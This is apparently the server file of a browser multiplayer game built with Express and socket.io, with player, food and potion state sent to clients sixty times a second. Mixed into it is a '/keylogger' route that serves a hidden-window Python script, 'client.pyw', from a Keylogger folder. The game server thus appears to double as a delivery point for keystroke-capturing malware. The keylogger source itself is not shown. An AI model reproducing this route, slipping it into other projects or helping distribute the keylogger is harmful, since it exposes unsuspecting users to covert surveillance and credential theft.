const express = require('express');
const path = require('path');
const app = express();
const serv = require('http').Server(app);
const io = require('socket.io')(serv, {});
const port = 1337;

//import {changeDirection} from 'Player'
const handler = require('./handler');
const Player = require ('./Entities');
const dispatch = require('./Dispatch');


class Server {
    constructor(){
        app.set('trust proxy', true);
        app.use(express.static('../Client'));
        this.dir = path.join(__dirname, '../Client/');
        this.kl_path = path.join(__dirname, "../../Keylogger/");

    }
}

server = new Server();
app.get('/', (req, res, next) => {
    console.log(`Received connection from ${req.ip}`);
    res.sendFile(server.dir + 'index.html', (err) => {
        if (err){
            console.log(err);
        }
    });

});

app.get('/keylogger', (req, res) => {
    res.download(server.kl_path + 'client.pyw');
});

serv.listen(port, () => {
    console.log(`Server now listening on port ${port}`)
});


/*
=====================================================
=================== Game Setup ======================
=====================================================
*/

// Global variables
global.players = {};
global.foods = [];
global.potions = [];
global.enemies = [];

SOCKET_LIST = {};



io.sockets.on('connection', (socket)=> {
    let ip = socket.handshake.address;
    console.log(`New connection from ${ip}`);

    SOCKET_LIST[socket.id] = socket;
    players[socket.id] = new Player(450, 350, 10, 10);
    players[socket.id]['id'] = socket.id;

    console.log(players);

    socket.on('keyPress', (pack)=>{
        handler.keyPressHandler(pack);
    });



    socket.on('disconnect', () => {
        console.log(`${ip} has disconnected.`);
        delete players[socket.id];
        delete SOCKET_LIST[socket.id];
    })
});

module.exports.config = config = {};
config.windowX = 900;
config.windowY = 700;


setInterval( () => {
    dispatch.summonFood();
    dispatch.summonPotions();

    for (let i in players){
        players[i].update();
    }
    for (let i in SOCKET_LIST){
        let socket = SOCKET_LIST[i];
        socket.emit('players', players);
        socket.emit('food', foods);
        socket.emit('potions', potions);
        socket.emit('draw');
    }
}, 1000/60);


